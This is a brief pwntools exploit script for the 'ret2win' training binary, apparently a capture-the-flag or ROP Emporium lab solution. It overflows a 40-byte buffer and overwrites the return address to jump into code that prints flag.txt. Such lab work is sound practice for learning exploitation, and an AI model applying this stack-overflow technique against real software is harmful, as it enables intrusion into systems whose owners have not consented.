#!/usr/bin/python3


from pwn import *

p = process("./ret2win") # start bin
elf = ELF("./ret2win") # Extract data from binary
rop = ROP(elf) # Find ROP gadgets

ret2win=elf.symbols['ret2win'] # should be 0x00400756
log.info("ret2win @ " + hex(ret2win))

exploit = b"".join([
  b"A"*40,
  #p64(ret2win)
  p64(0x00400764) # radare2 pdf @sym.ret2win output: 0x00400764      bf43094000     mov edi, str._bin_cat_flag.txt ; 0x400943 ; "/bin/cat flag.txt" ; const char *string
  ])

pid = util.proc.pidof(p)[0]
print("[*] PID = " + str(pid))

# Uncomment this if you want to use the debugger
# util.proc.wait_for_debugger(pid)

p.recv()
p.sendline(exploit)
print(p.recvall().decode())
#p.interactive()

